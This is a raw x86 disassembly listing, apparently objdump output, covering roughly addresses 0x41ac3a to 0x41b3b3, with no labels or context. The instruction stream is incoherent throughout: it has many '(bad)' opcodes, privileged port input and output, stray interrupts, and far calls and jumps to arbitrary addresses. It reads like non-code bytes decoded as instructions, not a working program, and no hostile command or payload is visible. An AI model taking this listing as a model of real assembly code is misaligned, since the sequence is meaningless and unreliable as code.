  41ac3a:	push   0xdc2f18f1
  41ac3f:	stos   DWORD PTR es:[edi],eax
  41ac40:	push   ss
  41ac41:	in     al,dx
  41ac42:	sahf   
  41ac43:	xor    eax,DWORD PTR [edi-0x5b8e74fb]
  41ac49:	aad    0x7b
  41ac4b:	scas   eax,DWORD PTR es:[edi]
  41ac4c:	mov    esi,0x9f95770f
  41ac51:	sub    BYTE PTR [ebx-0x23],bh
  41ac54:	mov    BYTE PTR [ebx],0x3a
  41ac57:	jmp    0x41ac85
  41ac59:	adc    cl,BYTE PTR [ebx+0x3c985e27]
  41ac5f:	sub    al,0xc0
  41ac61:	cmp    bl,BYTE PTR [esi]
  41ac63:	iret   
  41ac64:	mov    ecx,0xc405639e
  41ac69:	je     0x41ac1b
  41ac6b:	sahf   
  41ac6c:	cmp    al,0x79
  41ac6e:	scas   eax,DWORD PTR es:[edi]
  41ac6f:	aam    0x48
  41ac71:	mov    dh,0x39
  41ac73:	mov    fs,WORD PTR [edi-0x31769f6b]
  41ac79:	pop    es
  41ac7a:	nop
  41ac7b:	stos   DWORD PTR es:[edi],eax
  41ac7c:	cmp    BYTE PTR ds:0xb0d5d20d,ch
  41ac82:	out    dx,al
  41ac83:	(bad)  
  41ac84:	aas    
  41ac85:	jne    0x41ac35
  41ac87:	ins    BYTE PTR es:[edi],dx
  41ac88:	or     al,ah
  41ac8a:	jnp    0x41ac2d
  41ac8c:	out    dx,al
  41ac8d:	cwde   
  41ac8e:	xor    al,0x35
  41ac90:	les    ebp,FWORD PTR [ecx-0x60ff2b30]
  41ac96:	or     eax,0x7802b61f
  41ac9b:	test   bh,al
  41ac9d:	sub    al,0x7d
  41ac9f:	in     eax,dx
  41aca0:	jge    0x41acde
  41aca2:	pusha  
  41aca3:	inc    edi
  41aca4:	jl     0x41aca7
  41aca6:	cmp    eax,0x158cde8e
  41acab:	xlat   BYTE PTR ds:[ebx]
  41acac:	test   eax,0x8fd8365c
  41acb1:	push   edx
  41acb2:	mov    ds:0x35622946,eax
  41acb7:	leave  
  41acb8:	mov    BYTE PTR [ebx+0x433d53c1],cl
  41acbe:	ins    BYTE PTR es:[edi],dx
  41acbf:	push   esp
  41acc0:	inc    edi
  41acc1:	add    ah,BYTE PTR [edx+0x7b2a82ff]
  41acc7:	adc    BYTE PTR gs:[esi-0x5d55dee1],bh
  41acce:	sar    DWORD PTR [ecx+0x76],cl
  41acd1:	in     al,dx
  41acd2:	adc    bl,BYTE PTR [ecx-0x2a870d2f]
  41acd8:	xor    al,0xe2
  41acda:	bnd jb 0x41acfc
  41acdd:	push   0x1e
  41acdf:	sub    eax,0x2c9cac4e
  41ace4:	es dec eax
  41ace6:	xchg   esp,eax
  41ace7:	aad    0x80
  41ace9:	enter  0x48a1,0xf9
  41aced:	aaa    
  41acee:	push   DWORD PTR [esi]
  41acf0:	mov    DWORD PTR [ecx],esp
  41acf2:	repz dec edx
  41acf4:	mov    dl,0x8
  41acf6:	retf   
  41acf7:	fiadd  DWORD PTR [esp+ebx*1]
  41acfa:	jle    0x41acfc
  41acfc:	clc    
  41acfd:	inc    esp
  41acfe:	push   esi
  41acff:	stc    
  41ad00:	or     BYTE PTR [ebp+0x24],dl
  41ad03:	leave  
  41ad04:	mov    DWORD PTR [ecx-0x640da3d5],esp
  41ad0a:	repnz cld 
  41ad0c:	push   0x4687da02
  41ad11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad12:	cmc    
  41ad13:	push   edx
  41ad14:	inc    DWORD PTR [edi+0xa1c1b60]
  41ad1a:	mov    cl,0x67
  41ad1c:	shl    dh,1
  41ad1e:	jmp    0x41acf2
  41ad20:	add    ch,BYTE PTR ds:0x7ac6b0cb
  41ad26:	jle    0x41acce
  41ad28:	push   ebx
  41ad29:	push   edi
  41ad2a:	pop    ds
  41ad2b:	idiv   DWORD PTR [esi]
  41ad2d:	or     cl,BYTE PTR [ebx]
  41ad2f:	rcl    DWORD PTR [eax+edi*2+0x77bd42b],cl
  41ad36:	lea    esi,[ecx-0x23a4ef02]
  41ad3c:	mov    bh,dl
  41ad3e:	mov    WORD PTR [edi],ss
  41ad40:	lahf   
  41ad41:	leave  
  41ad42:	sahf   
  41ad43:	jnp    0x41ad60
  41ad45:	add    ch,BYTE PTR [edx]
  41ad47:	add    eax,0xd328fcf1
  41ad4c:	xchg   ebp,eax
  41ad4d:	gs push ds
  41ad4f:	out    dx,eax
  41ad50:	push   cs
  41ad51:	outs   dx,DWORD PTR ds:[esi]
  41ad52:	lds    edx,FWORD PTR [edi-0x2a8ef6c6]
  41ad58:	cwde   
  41ad59:	mov    eax,0x8d460e9d
  41ad5e:	jle    0x41ad0a
  41ad60:	icebp  
  41ad61:	fisttp DWORD PTR ds:0x8ce38bb8
  41ad67:	adc    al,0x20
  41ad69:	shl    BYTE PTR [edi+0x4d],1
  41ad6c:	add    edx,DWORD PTR [edx+edx*4]
  41ad6f:	call   0xa59b:0xd4001c85
  41ad76:	sub    bh,BYTE PTR [eax-0x78]
  41ad79:	mov    cl,0x82
  41ad7b:	fld    TBYTE PTR [eax]
  41ad7d:	xor    bl,0x3a
  41ad80:	mov    bl,0x2
  41ad82:	inc    edx
  41ad83:	in     eax,dx
  41ad84:	mov    bh,0xf2
  41ad86:	inc    esi
  41ad87:	sub    BYTE PTR [ebx+0x79a00f9a],bh
  41ad8d:	jg     0x41adad
  41ad8f:	sbb    ebp,edx
  41ad91:	pop    edi
  41ad92:	(bad)  
  41ad94:	ss adc al,0x92
  41ad97:	xlat   BYTE PTR ds:[ebx]
  41ad98:	data16 fistp WORD PTR ds:0xbfb95664
  41ad9f:	adc    eax,0xc1644dbd
  41ada4:	aad    0xac
  41ada6:	push   eax
  41ada7:	and    eax,0x4c008299
  41adac:	or     bh,bh
  41adae:	(bad)  
  41adaf:	aam    0xd7
  41adb1:	mov    edi,?
  41adb3:	or     al,0xf9
  41adb5:	cwde   
  41adb6:	xadd   BYTE PTR [eax-0x77a6dc5f],cl
  41adbd:	or     BYTE PTR [ebx+0x2a],0xf
  41adc1:	add    al,al
  41adc3:	imul   ebx,DWORD PTR [ebx-0x40],0xb6c9a91c
  41adca:	pop    ds
  41adcb:	dec    ecx
  41adcc:	mov    ch,0x9f
  41adce:	add    BYTE PTR [eax+0x60],bh
  41add1:	push   cs
  41add2:	adc    ah,0x68
  41add5:	mov    eax,ds:0x80d29ad8
  41adda:	mov    dh,0x7a
  41addc:	mov    eax,0x8c330896
  41ade1:	test   eax,0xb8e60b0b
  41ade6:	sbb    ch,BYTE PTR ds:0x627f37b4
  41adec:	mov    dh,0xaa
  41adee:	push   edi
  41adef:	aam    0x4
  41adf1:	iret   
  41adf2:	lds    ebp,FWORD PTR [edx-0x6a]
  41adf5:	xlat   BYTE PTR ds:[ebx]
  41adf6:	push   cs
  41adf7:	jbe    0x41ada7
  41adf9:	fst    QWORD PTR [esi+0x15]
  41adfc:	mov    DWORD PTR [edi],edx
  41adfe:	cmp    al,dh
  41ae00:	jbe    0x41ae4b
  41ae02:	push   ebx
  41ae03:	aam    0x8c
  41ae05:	lds    ebp,FWORD PTR [ebx-0x1c]
  41ae08:	jmp    0x41ae2d
  41ae0a:	pushf  
  41ae0b:	xor    eax,0xfc214388
  41ae10:	dec    edi
  41ae11:	xchg   ecx,eax
  41ae12:	add    ch,BYTE PTR [edi]
  41ae14:	js     0x41ae19
  41ae16:	mov    bh,bl
  41ae18:	pushf  
  41ae19:	cmp    ah,BYTE PTR [edx]
  41ae1b:	jge    0x41ae26
  41ae1d:	push   ecx
  41ae1e:	pop    ds
  41ae1f:	ja     0x41ae7a
  41ae21:	cld    
  41ae22:	addr16 aas 
  41ae24:	mov    al,ds:0x2cbbf146
  41ae29:	enter  0x95d1,0xc8
  41ae2d:	mov    ebp,0xbd6eb47
  41ae32:	pop    ds
  41ae33:	in     eax,0x4e
  41ae35:	aas    
  41ae36:	leave  
  41ae37:	int3   
  41ae38:	mov    dh,0xd7
  41ae3a:	push   ecx
  41ae3b:	aam    0x56
  41ae3d:	shr    edx,0x8
  41ae40:	adc    al,0xa8
  41ae42:	sub    ebx,eax
  41ae44:	mov    DWORD PTR [ebp-0x4d999531],eax
  41ae4a:	das    
  41ae4b:	jle    0x41ae35
  41ae4d:	jne    0x41adde
  41ae4f:	mov    ebx,0x17385f26
  41ae54:	dec    ecx
  41ae55:	ficom  WORD PTR [edi+0x20]
  41ae58:	sti    
  41ae59:	aad    0x66
  41ae5b:	cmp    eax,0x1f6388c7
  41ae60:	xor    DWORD PTR ds:0x70c1eb61,0x2a
  41ae67:	sbb    eax,0xd437f1c4
  41ae6c:	xchg   esp,eax
  41ae6d:	mov    ebp,0x5b5c985a
  41ae72:	push   ds
  41ae73:	cmp    esi,DWORD PTR [edi]
  41ae75:	lahf   
  41ae76:	int    0xb1
  41ae78:	sbb    ah,BYTE PTR [eax-0x2c4c2be7]
  41ae7e:	imul   ebp,edx,0x54
  41ae81:	adc    ebp,ecx
  41ae83:	or     edi,DWORD PTR [eax]
  41ae85:	pusha  
  41ae86:	xor    eax,0x324e70d4
  41ae8b:	ds xchg ah,ch
  41ae8e:	xlat   BYTE PTR ds:[ebx]
  41ae90:	fwait
  41ae91:	out    dx,eax
  41ae92:	out    dx,eax
  41ae93:	xchg   esp,edi
  41ae95:	leave  
  41ae96:	iret   
  41ae97:	push   0x64497d89
  41ae9c:	jae    0x41ae9e
  41ae9e:	cmp    ebp,esi
  41aea0:	sbb    edx,DWORD PTR ds:0x17f11aba
  41aea6:	add    DWORD PTR [esi-0x78],esi
  41aea9:	stos   BYTE PTR es:[edi],al
  41aeaa:	shl    ch,0x1d
  41aead:	jecxz  0x41af0f
  41aeaf:	aas    
  41aeb0:	jns    0x41ae83
  41aeb2:	(bad)  
  41aeb3:	fidivr WORD PTR [edi+edi*8]
  41aeb6:	sub    ah,dl
  41aeb8:	mov    esp,0x95e5edbc
  41aebd:	loop   0x41ae7c
  41aebf:	cmp    ecx,DWORD PTR [eax+0x150451cb]
  41aec5:	jge    0x41aef4
  41aec7:	sbb    BYTE PTR [edi+0x44],cl
  41aeca:	push   ss
  41aecb:	xchg   edi,eax
  41aecc:	bound  eax,QWORD PTR [ebx+0x71d8d8e7]
  41aed2:	fdivr  QWORD PTR ds:0x4b992988
  41aed8:	ins    BYTE PTR es:[edi],dx
  41aed9:	sub    eax,0x3a724b6
  41aede:	je     0x41af1e
  41aee0:	fstp   QWORD PTR [esi-0x1501f4d2]
  41aee6:	je     0x41aef2
  41aee8:	xchg   edi,eax
  41aee9:	jne    0x41ae6f
  41aeeb:	mov    ecx,DWORD PTR [ebx+0x2]
  41aeee:	push   edx
  41aeef:	sub    DWORD PTR [esp+eiz*2-0x7b],edi
  41aef3:	aam    0xbe
  41aef5:	mov    BYTE PTR ds:0xabe76b64,ch
  41aefb:	retf   0x1f82
  41aefe:	add    bh,BYTE PTR [ebx]
  41af00:	ret    0xeebe
  41af03:	mov    al,0x8
  41af05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af06:	aaa    
  41af07:	jo     0x41aedf
  41af09:	add    eax,0x5f3b2d10
  41af0e:	jnp    0x41af09
  41af10:	mov    ebx,0x6c356461
  41af15:	in     al,dx
  41af16:	dec    eax
  41af17:	lds    ebp,FWORD PTR [esi]
  41af19:	add    DWORD PTR [ecx+0x5c09387b],ebp
  41af1f:	aam    0xc8
  41af21:	dec    esp
  41af22:	push   esi
  41af23:	lock cmp al,0x7a
  41af26:	es pop ebx
  41af28:	fdivr  st,st(5)
  41af2a:	adc    eax,0xb9bf89f0
  41af2f:	mov    ds:0xdb35867d,eax
  41af34:	jp     0x41af38
  41af36:	retf   0xcd82
  41af39:	mov    eax,0x647eca9e
  41af3e:	sbb    ebp,DWORD PTR [ebx]
  41af40:	mov    ah,ch
  41af42:	enter  0x366a,0xb5
  41af46:	sub    eax,0x6bfe89da
  41af4b:	arpl   bp,ax
  41af4d:	jmp    0x8139d284
  41af52:	mov    esp,0x1e3ae011
  41af57:	dec    ecx
  41af58:	inc    ecx
  41af59:	pop    eax
  41af5a:	inc    esp
  41af5b:	ins    DWORD PTR es:[edi],dx
  41af5c:	mov    eax,DWORD PTR [edx]
  41af5e:	xchg   BYTE PTR [ebp-0x6c],dh
  41af61:	sbb    esi,0x1fad1186
  41af67:	fist   DWORD PTR [ecx-0x17]
  41af6a:	stc    
  41af6b:	retf   0xc705
  41af6e:	push   0x5d
  41af70:	into   
  41af71:	scas   eax,DWORD PTR es:[edi]
  41af72:	pusha  
  41af73:	inc    edi
  41af74:	cmp    eax,0xe3a07c2b
  41af79:	aas    
  41af7a:	push   ds
  41af7b:	mov    edi,0x857b70e
  41af80:	mov    WORD PTR [ebx-0x23],fs
  41af83:	std    
  41af84:	out    0x2,eax
  41af86:	sahf   
  41af87:	add    DWORD PTR [ebx+edi*8],ecx
  41af8a:	mov    dh,0xfe
  41af8c:	push   ecx
  41af8d:	cld    
  41af8e:	pusha  
  41af8f:	and    edi,DWORD PTR [edx+0x65]
  41af92:	dec    ebp
  41af93:	iret   
  41af94:	test   BYTE PTR [edx-0x49],dh
  41af97:	int    0x14
  41af99:	sbb    eax,0xd119571a
  41af9e:	jb     0x41af6e
  41afa0:	stc    
  41afa1:	inc    esp
  41afa2:	mov    ch,0xe8
  41afa4:	mov    DWORD PTR ds:0xcb1ff760,edx
  41afaa:	aaa    
  41afab:	add    edx,edi
  41afad:	add    bl,BYTE PTR [edi+edi*2+0x60d6d0c6]
  41afb4:	call   0xd9ff:0xa9591e58
  41afbb:	or     BYTE PTR [edx+0x6f],dh
  41afbe:	dec    edx
  41afbf:	aam    0xa3
  41afc1:	call   0x4b227df2
  41afc6:	cwde   
  41afc7:	xchg   edi,eax
  41afc8:	mov    BYTE PTR [ebx-0x6ed34a20],ch
  41afce:	shl    DWORD PTR [edx+0x46238943],0x89
  41afd5:	push   cs
  41afd6:	stos   DWORD PTR es:[edi],eax
  41afd7:	dec    esi
  41afd8:	xlat   BYTE PTR ds:[ebx]
  41afd9:	das    
  41afda:	aad    0x3e
  41afdc:	mov    BYTE PTR ds:0xd4354248,dh
  41afe2:	iret   
  41afe3:	mov    ecx,0xd0720228
  41afe8:	sub    eax,0x1783b213
  41afed:	cld    
  41afee:	pusha  
  41afef:	adc    eax,0x6d617cb0
  41aff4:	aam    0xc8
  41aff6:	jno    0x41afcf
  41aff8:	push   ebp
  41aff9:	push   0xe28ebefe
  41affe:	mov    ds:0x608709fc,al
  41b003:	xchg   ecx,eax
  41b004:	xor    eax,0x5c4c663d
  41b009:	bnd ja 0x41afe1
  41b00c:	or     eax,0xf3a7ad0d
  41b011:	outs   dx,DWORD PTR ds:[esi]
  41b012:	(bad)  
  41b013:	mov    ecx,DWORD PTR [eax-0x17505c27]
  41b019:	sbb    eax,0x62a2ddd1
  41b01e:	outs   dx,DWORD PTR ds:[esi]
  41b01f:	aam    0xea
  41b021:	fmul   QWORD PTR [ebx+0x3245ab61]
  41b027:	mov    dl,0x89
  41b029:	fldcw  WORD PTR [edi]
  41b02b:	jge    0x41afe9
  41b02d:	js     0x41b004
  41b02f:	shl    BYTE PTR [ebp+0x6a188a05],cl
  41b035:	jbe    0x41b009
  41b037:	xchg   DWORD PTR [ecx],edi
  41b039:	sbb    BYTE PTR [edi+esi*1+0x55],0xd9
  41b03e:	pusha  
  41b03f:	test   BYTE PTR [ebp+esi*8+0x2ed8db8],bl
  41b046:	dec    esp
  41b047:	push   0x34297ba4
  41b04c:	jmp    0x41afce
  41b04e:	ins    BYTE PTR es:[edi],dx
  41b04f:	pop    ds
  41b050:	inc    eax
  41b051:	fwait
  41b052:	pop    es
  41b053:	outs   dx,DWORD PTR ds:[esi]
  41b054:	loopne 0x41b0a1
  41b056:	repnz adc ecx,esi
  41b059:	xor    BYTE PTR [eax],0x1a
  41b05c:	rol    DWORD PTR [ecx+0x6f891c3c],cl
  41b062:	fwait
  41b063:	cmp    esi,DWORD PTR [eax-0x16]
  41b066:	daa    
  41b067:	sub    eax,0xd48e05cb
  41b06c:	inc    esi
  41b06d:	xor    ch,cl
  41b06f:	and    DWORD PTR [ecx+0x38],edi
  41b072:	xchg   WORD PTR [esi+0x4],di
  41b076:	cld    
  41b077:	int    0x89
  41b079:	xchg   esi,eax
  41b07a:	data16 xlat BYTE PTR ds:[ebx]
  41b07c:	clc    
  41b07d:	add    eax,0x6db18270
  41b082:	mov    eax,0x1f67d9c1
  41b087:	or     esi,ecx
  41b089:	fild   QWORD PTR [edi+0x18bd68f0]
  41b08f:	aam    0xb9
  41b091:	xor    al,dl
  41b093:	push   edx
  41b094:	fisttp WORD PTR [ebp+0x15]
  41b097:	mov    ch,0x88
  41b099:	inc    edi
  41b09a:	daa    
  41b09b:	outs   dx,BYTE PTR ds:[esi]
  41b09c:	ds lods eax,DWORD PTR fs:[esi]
  41b09f:	sbb    al,0xd2
  41b0a1:	sbb    esi,DWORD PTR [esi-0x40d3f46d]
  41b0a7:	aam    0x17
  41b0a9:	mov    BYTE PTR [eax],cl
  41b0ab:	test   DWORD PTR [ecx-0x458c1d7],ecx
  41b0b1:	out    dx,al
  41b0b2:	les    edx,FWORD PTR [ecx]
  41b0b4:	push   0xffffffab
  41b0b6:	xchg   ebp,eax
  41b0b7:	jnp    0x41b0b4
  41b0b9:	mov    bl,0x7e
  41b0bb:	loopne 0x41b0e4
  41b0bd:	mov    ebx,0xfdbbe5f
  41b0c2:	in     al,dx
  41b0c3:	fild   WORD PTR [esi+0xaf97dab]
  41b0c9:	or     esp,DWORD PTR [esi+0x61]
  41b0cc:	cmp    BYTE PTR [ebx],dl
  41b0ce:	aad    0x47
  41b0d0:	mov    al,ds:0x4a916602
  41b0d5:	pop    edx
  41b0d6:	into   
  41b0d7:	inc    ebp
  41b0d8:	mov    edx,0x36311f1e
  41b0dd:	adc    eax,0xe20a4b1a
  41b0e2:	rcl    edi,cl
  41b0e4:	fcom   st(3)
  41b0e6:	int3   
  41b0e7:	stc    
  41b0e8:	xchg   edx,eax
  41b0e9:	push   es
  41b0ea:	push   ebp
  41b0eb:	xchg   ebp,eax
  41b0ec:	dec    eax
  41b0ed:	popa   
  41b0ee:	push   ds
  41b0ef:	dec    ebp
  41b0f0:	xor    BYTE PTR [edx+0x37f68611],dh
  41b0f6:	cmp    esp,edx
  41b0f8:	or     eax,esp
  41b0fa:	mov    ch,dl
  41b0fc:	out    dx,al
  41b0fd:	sti    
  41b0fe:	mov    ebp,0xbe559488
  41b103:	int3   
  41b104:	jp     0x41b122
  41b106:	xor    ch,al
  41b108:	mov    ah,0xa2
  41b10a:	and    ch,bh
  41b10c:	mov    eax,0xde081c05
  41b111:	mov    dl,ch
  41b113:	mul    esi
  41b115:	push   ds
  41b116:	push   edi
  41b117:	add    eax,0x89f79d1
  41b11c:	push   esp
  41b11d:	ficomp WORD PTR [edi+eiz*8-0x6d]
  41b121:	pop    ds
  41b122:	in     al,dx
  41b123:	dec    esi
  41b124:	cmc    
  41b125:	test   eax,0x51787b33
  41b12a:	push   esi
  41b12b:	sar    BYTE PTR [ecx-0x16],1
  41b12e:	pusha  
  41b12f:	ror    esi,0x3b
  41b132:	stc    
  41b133:	jae    0x41b15f
  41b135:	xchg   ebx,eax
  41b136:	test   ebp,edx
  41b138:	add    edx,ebp
  41b13a:	xchg   esp,eax
  41b13b:	mov    ecx,0x22008ad5
  41b140:	les    ebx,FWORD PTR [ebp+0x258884e3]
  41b146:	jp     0x41b1ab
  41b148:	jo     0x41b159
  41b14a:	pop    ecx
  41b14b:	aam    0x10
  41b14d:	mov    edi,0x2ec0e8b9
  41b152:	mov    esp,0x65897939
  41b157:	xchg   ecx,eax
  41b158:	adc    al,al
  41b15a:	fmul   DWORD PTR [edi]
  41b15c:	jae    0x41b1b8
  41b15e:	lahf   
  41b15f:	and    BYTE PTR [edx+ebx*1-0xdb72bcc],0x3b
  41b167:	int    0xd7
  41b169:	sti    
  41b16a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b16b:	sub    cl,BYTE PTR [ecx+0x371c8089]
  41b171:	mov    dl,0x7c
  41b173:	in     al,0xcc
  41b175:	repz popf 
  41b177:	cwde   
  41b178:	jle    0x41b15b
  41b17a:	pop    ebp
  41b17b:	push   esp
  41b17c:	mov    DWORD PTR [edx+ebx*8],esp
  41b17f:	ficom  WORD PTR ds:0xe53960cb
  41b185:	or     eax,0x53922a76
  41b18a:	(bad)  
  41b18b:	aam    0xc6
  41b18d:	cmp    BYTE PTR [eax],0x28
  41b190:	push   cs
  41b191:	ds push ds
  41b193:	cld    
  41b194:	mov    al,ds:0xf1997ee1
  41b199:	add    bh,BYTE PTR [esi]
  41b19b:	cdq    
  41b19c:	into   
  41b19d:	xor    edx,esi
  41b19f:	mov    ds:0x23fe032d,al
  41b1a4:	cmp    DWORD PTR [edi+0x5cd3e2f7],edi
  41b1aa:	ins    DWORD PTR es:[edi],dx
  41b1ab:	or     ecx,DWORD PTR [edx-0x17a56c5d]
  41b1b1:	dec    ebp
  41b1b2:	inc    esp
  41b1b3:	cmp    DWORD PTR [ebx+0x27],0x9ae91906
  41b1ba:	loope  0x41b144
  41b1bc:	cs jbe 0x41b1a1
  41b1bf:	std    
  41b1c0:	test   DWORD PTR [eax],esi
  41b1c2:	pop    ds
  41b1c3:	push   ebp
  41b1c4:	rcr    BYTE PTR [ecx-0x6153fe86],1
  41b1ca:	mov    ah,0xab
  41b1cc:	fidiv  DWORD PTR [eax]
  41b1ce:	mov    ds:0xdd232449,al
  41b1d3:	push   edx
  41b1d4:	jns    0x41b1be
  41b1d6:	popw   ss
  41b1d8:	pop    ecx
  41b1d9:	mov    ecx,0x8207ae29
  41b1de:	jbe    0x41b1c5
  41b1e0:	sbb    edx,DWORD PTR [ebx-0x6a]
  41b1e3:	fimul  DWORD PTR [edi]
  41b1e5:	add    ebx,DWORD PTR [ebx+esi*1-0x15]
  41b1e9:	cwde   
  41b1ea:	daa    
  41b1eb:	xchg   edx,eax
  41b1ec:	dec    esp
  41b1ed:	sbb    ebx,DWORD PTR [edi]
  41b1ef:	xor    ebp,edi
  41b1f1:	xchg   ebx,eax
  41b1f2:	in     eax,0x9b
  41b1f4:	jp     0x41b235
  41b1f6:	xchg   esi,eax
  41b1f7:	aad    0xab
  41b1f9:	or     esp,DWORD PTR [esi+eax*8+0x769049be]
  41b200:	mov    DWORD PTR [ebx+0x29e05f6a],esp
  41b206:	mov    bl,0x97
  41b209:	pop    ss
  41b20a:	mov    al,0xd1
  41b20c:	fimul  WORD PTR [edx]
  41b20e:	test   eax,ebx
  41b210:	or     DWORD PTR [edi],edx
  41b212:	daa    
  41b213:	mov    al,ds:0xf4a1b77
  41b218:	sub    edx,DWORD PTR [edi+ebx*1+0x59dd1e0d]
  41b21f:	push   edi
  41b220:	dec    edi
  41b221:	sub    eax,0x613ab7b2
  41b226:	pop    ds
  41b227:	sub    BYTE PTR [edx],al
  41b229:	xor    dl,dh
  41b22b:	dec    ebp
  41b22c:	mov    cl,0x49
  41b22e:	dec    ecx
  41b22f:	cld    
  41b230:	mov    edi,ecx
  41b232:	add    edi,edx
  41b234:	dec    esi
  41b235:	dec    edx
  41b236:	mov    ecx,0xc18eaae1
  41b23b:	jae    0x41b1f3
  41b23d:	xchg   esp,eax
  41b23e:	inc    edi
  41b23f:	cmp    DWORD PTR [esi-0x21],edx
  41b242:	mov    ch,0xd6
  41b244:	mov    DWORD PTR [ebx-0x15],ebx
  41b247:	cwde   
  41b248:	aaa    
  41b249:	push   0x21ab2d1f
  41b24e:	xchg   esi,eax
  41b24f:	cmp    BYTE PTR [esi],ch
  41b251:	retf   0xa67d
  41b254:	and    edi,DWORD PTR [edx+0x5d]
  41b257:	int    0x88
  41b259:	xor    BYTE PTR [ecx-0x60],bl
  41b25c:	jmp    0x41b22f
  41b25e:	pusha  
  41b25f:	adc    eax,0xc43d9f77
  41b264:	hlt    
  41b265:	inc    esp
  41b266:	out    0xd4,eax
  41b268:	inc    esi
  41b269:	scas   al,BYTE PTR es:[edi]
  41b26a:	repz and al,0x24
  41b26d:	es (bad) 
  41b26f:	mov    esp,0x8dc55989
  41b274:	test   BYTE PTR [esi+eiz*1],dl
  41b277:	inc    ebp
  41b278:	pop    edi
  41b279:	add    cl,dl
  41b27b:	(bad)  
  41b27c:	fisttp WORD PTR [edi-0x4b07a9f3]
  41b282:	pop    ds
  41b283:	in     eax,0xa2
  41b285:	push   ss
  41b286:	sar    BYTE PTR [ebx],1
  41b288:	adc    dh,cl
  41b28a:	inc    esi
  41b28b:	aad    0xb6
  41b28d:	dec    ebx
  41b28e:	test   al,bh
  41b290:	add    al,0x37
  41b292:	sub    al,0xa
  41b294:	mov    ebx,ecx
  41b296:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b298:	je     0x41b2ed
  41b29a:	adc    eax,0xba008b60
  41b29f:	popf   
  41b2a0:	test   eax,0x1e743912
  41b2a5:	mov    bl,0x48
  41b2a7:	mov    bh,0x88
  41b2a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2aa:	pop    edi
  41b2ab:	mov    al,ds:0x8c47bb6
  41b2b0:	push   0x3
  41b2b2:	out    dx,al
  41b2b3:	adc    eax,0x41b25f57
  41b2b8:	add    eax,0xbd455610
  41b2bd:	dec    ebx
  41b2be:	lods   eax,DWORD PTR fs:[esi]
  41b2c0:	and    DWORD PTR [ebp+0x6b129422],edx
  41b2c6:	popa   
  41b2c7:	aad    0x96
  41b2c9:	adc    eax,0x6901b0d5
  41b2ce:	lea    ebx,[edi-0xcd8b86c]
  41b2d4:	push   edi
  41b2d5:	add    al,BYTE PTR [ebx-0x76]
  41b2d8:	mov    al,ds:0xa7d4a6c9
  41b2dd:	addr16 and al,0x94
  41b2e0:	in     eax,dx
  41b2e1:	mov    ch,0xd5
  41b2e3:	sub    DWORD PTR [edi+ecx*2+0x1f],eax
  41b2e7:	or     DWORD PTR [ecx],edx
  41b2e9:	sub    DWORD PTR [ebx],esi
  41b2eb:	cmp    DWORD PTR [esi+eiz*2-0x5d],ebx
  41b2ef:	aad    0x32
  41b2f1:	icebp  
  41b2f2:	int    0xe
  41b2f4:	(bad)  
  41b2f5:	add    BYTE PTR [edx],0xbe
  41b2f8:	mov    DWORD PTR [ecx],esi
  41b2fa:	mov    bl,0xd7
  41b2fc:	cmp    eax,0x6c28efa
  41b301:	lea    ecx,[ebx+0x60d8970]
  41b307:	addr16 jg 0x41b2ab
  41b30a:	cwde   
  41b30b:	push   ebx
  41b30c:	mov    BYTE PTR [ecx],cl
  41b30e:	loope  0x41b2de
  41b310:	adc    edx,eax
  41b312:	aaa    
  41b313:	sar    cl,1
  41b315:	daa    
  41b316:	(bad)  
  41b317:	(bad)  
  41b318:	jno    0x41b2c9
  41b31a:	pop    ebx
  41b31b:	aam    0xba
  41b31d:	xchg   ebp,eax
  41b31e:	xchg   ecx,eax
  41b31f:	xchg   ebx,eax
  41b320:	jle    0x41b385
  41b322:	push   edi
  41b323:	sti    
  41b324:	jae    0x41b327
  41b326:	lahf   
  41b327:	pop    ss
  41b328:	push   es
  41b329:	mov    edx,0x245d1000
  41b32e:	fsubr  DWORD PTR [eax]
  41b330:	adc    BYTE PTR ds:0x55d4baa1,cl
  41b336:	gs hlt 
  41b338:	in     al,0xae
  41b33a:	pusha  
  41b33b:	dec    ebx
  41b33c:	mov    cl,0x62
  41b33e:	int3   
  41b33f:	cmp    BYTE PTR [esi-0x4d],cl
  41b342:	sahf   
  41b343:	stos   BYTE PTR es:[edi],al
  41b344:	bound  edx,QWORD PTR [esi+ebp*2+0x1a]
  41b348:	rol    BYTE PTR [bp+di-0x6c49],0xd5
  41b34e:	clc    
  41b34f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b350:	mov    ebx,edx
  41b352:	xor    dl,BYTE PTR [esi+0xd]
  41b355:	mov    ecx,ds
  41b357:	add    bh,ah
  41b359:	add    dh,BYTE PTR [edx]
  41b35b:	and    esp,eax
  41b35d:	mov    bh,0x18
  41b35f:	xchg   ebp,eax
  41b360:	inc    edx
  41b361:	mov    eax,0x9ebc296e
  41b366:	dec    esi
  41b367:	ror    BYTE PTR [esi],0x93
  41b36a:	pop    es
  41b36b:	ins    DWORD PTR es:[edi],dx
  41b36c:	test   ebp,esp
  41b36e:	xchg   edx,eax
  41b36f:	test   al,0x2e
  41b371:	add    DWORD PTR [esi+ebx*1],ebx
  41b374:	push   es
  41b375:	dec    ecx
  41b376:	scas   eax,DWORD PTR es:[edi]
  41b377:	(bad)  
  41b378:	dec    eax
  41b379:	add    BYTE PTR [esi],0x70
  41b37c:	mov    BYTE PTR [ecx+0x10],cl
  41b37f:	add    al,0xab
  41b381:	popa   
  41b382:	xor    BYTE PTR [ecx+0x45],cl
  41b385:	add    ebp,DWORD PTR [edx+esi*4+0x76]
  41b389:	loope  0x41b37a
  41b38b:	xchg   ebp,eax
  41b38c:	pushaw 
  41b38e:	push   ds
  41b38f:	repz fisub WORD PTR [ebp+0x1c]
  41b393:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41b395:	outs   dx,BYTE PTR ds:[esi]
  41b396:	push   edx
  41b397:	aad    0x72
  41b399:	pusha  
  41b39a:	adc    DWORD PTR [ebp+0x3],0x27
  41b39e:	pop    edx
  41b39f:	cmp    al,0x89
  41b3a1:	sub    eax,0x9d1d35ba
  41b3a6:	pop    eax
  41b3a7:	inc    esi
  41b3a8:	mov    al,ds:0xaa58ae02
  41b3ad:	adc    BYTE PTR [ecx+edx*8],dl
  41b3b0:	js     0x41b3cc
  41b3b2:	popf   
  41b3b3:	pavgw  mm0,QWORD PTR [edx]
